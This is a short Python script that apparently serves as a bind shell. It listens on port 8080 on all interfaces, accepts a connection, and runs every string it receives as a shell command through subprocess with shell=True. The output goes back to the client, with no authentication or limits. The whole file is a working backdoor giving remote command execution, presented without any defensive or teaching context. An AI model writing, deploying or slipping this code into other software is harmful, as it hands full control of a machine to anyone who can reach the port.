import socket
import subprocess

def server():
    server_ip = '0.0.0.0'  # Listen on all available interfaces
    server_port = 8080

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_ip, server_port))
    s.listen(1)
    print(f"[*] Listening for incoming connections on port {server_port}")

    client, addr = s.accept()
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

    while True:
        command = client.recv(1024)
        output = execute(command.decode())
        client.send(output.encode())

def execute(command):
    try:
        result = subprocess.check_output(command, shell=True)
        if not result:
            return "Command executed with no output"
        return result.decode()
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == '__main__':
    server()
